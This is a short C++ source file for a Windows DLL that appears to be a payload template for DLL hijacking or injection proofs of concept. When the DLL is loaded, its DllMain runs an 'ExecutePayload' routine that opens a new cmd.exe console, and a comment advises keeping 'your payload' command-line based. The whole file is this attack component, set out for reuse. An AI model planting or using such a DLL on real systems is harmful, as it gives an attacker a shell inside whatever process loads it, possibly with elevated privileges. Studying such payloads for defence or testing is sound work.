#include <Windows.h>
#pragma optimize("", off)

//It is recommended to make your payload command line based (or with no command at all).

void spawnShell(void) noexcept 
{
    STARTUPINFOA startInfo;
    PROCESS_INFORMATION procInfo;
    ZeroMemory(&startInfo, sizeof(STARTUPINFOA));
    ZeroMemory(&procInfo, sizeof(PROCESS_INFORMATION));

    startInfo.dwFlags = STARTF_USESHOWWINDOW;
    startInfo.wShowWindow = SW_SHOW;
    startInfo.cb = sizeof(startInfo);

    if (CreateProcessA(nullptr,  (LPSTR)"C:\\Windows\\system32\\cmd.exe", 
        NULL, NULL, FALSE,CREATE_NEW_CONSOLE, NULL, NULL, &startInfo,
        &procInfo)
        )
    {
        CloseHandle(procInfo.hProcess);
        CloseHandle(procInfo.hThread);
    }
}

void ExecutePayload() noexcept
{
    spawnShell();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved )
{
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH: {
            ExecutePayload();
            break;
        }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

